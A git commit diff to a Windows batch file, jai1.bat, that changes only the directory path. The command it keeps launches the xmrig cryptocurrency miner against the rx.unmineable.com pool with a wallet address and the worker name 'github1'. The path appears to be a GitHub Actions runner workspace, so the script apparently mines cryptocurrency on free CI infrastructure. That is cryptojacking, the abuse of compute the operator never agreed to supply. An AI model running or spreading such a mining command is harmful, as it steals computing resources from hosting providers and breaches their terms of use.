e92eabb253dd3708d8e28b0f81acad3c1058284d
jaisai1337 <48624947+jaisai1337@users.noreply.github.com>
2021-09-01 10:17:19 +0530

    Update jai1.bat

--- jai1.bat
+++ jai1.bat
@@ -1,2 +1,2 @@
-D:\a\impu\impu\xmrig\xmrig\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.github1 -p x --cpu 4
+D:\a\jaiimpu\jaiimpu\xmrig\xmrig\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u BTT:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.github1 -p x --cpu 4
 pause
